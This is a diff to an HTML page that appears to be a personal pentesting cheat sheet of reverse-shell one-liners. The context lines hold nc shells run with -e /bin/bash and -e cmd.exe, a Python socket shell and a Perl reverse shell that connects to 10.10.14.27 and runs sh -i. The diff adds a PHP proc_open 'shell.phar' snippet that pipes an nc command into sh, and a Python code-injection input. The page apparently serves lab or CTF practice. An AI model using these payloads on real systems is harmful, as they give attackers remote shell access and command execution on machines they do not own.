@@ -11,9 +11,38 @@ nc &lt;ip&gt; &lt;port&gt; -e /bin/bash<br/>
 nc &lt;ip&gt; &lt;port&gt; -e cmd.exe<br/>
 <br/>
 <br/>
-<b>php</b><br/>
-pentest monkey<br/>
+<b>php <br/>
 <br/>
+<br/>
+</b><b>(</b>with proc_open &amp; proc_close<b>&nbsp;- shell.phar)</b><br/>
+<br/>
+&lt;?php<br/>
+<br/>
+$descriptorspec = array(<br/>
+0 =&gt; array("pipe", "r"),<br/>
+1 =&gt; array("pipe", "w"),<br/>
+2 =&gt; array("file", "/tmp/error-output.txt", "a")<br/>
+);<br/>
+<br/>
+$cwd = "/tmp";<br/>
+$env = array("some_option" =&gt; "aeiou");<br/>
+$process = proc_open("sh", $descriptorspec, $pipes, $cwd, $env);<br/>
+if (is_resource($process)) {<br/>
+<br/>
+<br/>
+fwrite($pipes[0], "nc 127.0.0.1 9001");<br/>
+fclose($pipes[0]);<br/>
+echo stream_get_contents($pipes[1]);<br/>
+fclose($pipes[1]);<br/>
+<br/>
+$return_value = proc_close($process);<br/>
+echo "command returned $return_value\n";<br/>
+}<br/>
+?&gt;<br/>
+<br/>
+<br/>
+<b>python injection input</b><br/>
+__import__('os').system('whoami')<br/>
 <br/>
 <b>python.py</b><br/>
 <br/>
@@ -22,4 +51,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 <br/>
 <b>perl<br/>
 <br/>
-</b>perl -e 'use Socket;$i="10.10.14.27";$p=2323;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("sh -i");};'</body></html>
+</b>perl -e 'use Socket;$i="10.10.14.27";$p=2323;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("sh -i");};'<br/>
+<br/>
+<br/>
+</body></html>
